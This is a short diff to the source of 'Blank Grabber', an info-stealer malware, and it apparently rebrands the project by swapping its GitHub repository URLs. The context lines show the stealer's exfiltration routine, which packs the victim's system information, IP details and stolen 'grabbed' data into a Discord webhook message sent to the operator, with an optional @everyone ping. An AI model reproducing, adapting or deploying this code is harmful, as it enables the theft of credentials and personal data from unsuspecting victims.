@@ -1694,7 +1694,7 @@ class BlankGrabber:
 
         match Settings.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://raw.githubusercontent.com/f4kedre4lity/Blank-Grabber/main/.github/workflows/image.png"
+                image_url = "https://raw.githubusercontent.com/haiAzure/Blank-Grabber/main/.github/workflows/image.png"
 
                 payload = {
                     "content": "||@everyone||" if Settings.PingMe else "",
@@ -1702,10 +1702,10 @@ class BlankGrabber:
                         {
                             "title": "Blank Grabber",
                             "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
-                            "url": "https://github.com/f4kedre4lity/Blank-Grabber",
+                            "url": "https://github.com/haiAzure/Blank-Grabber",
                             "color": 34303,
                             "footer": {
-                                "text": "Grabbed by Blank Grabber | https://github.com/f4kedre4lity/Blank-Grabber"
+                                "text": "Grabbed by Blank Grabber | https://github.com/haiAzure/Blank-Grabber"
                             },
                             "thumbnail": {
                                 "url": image_url
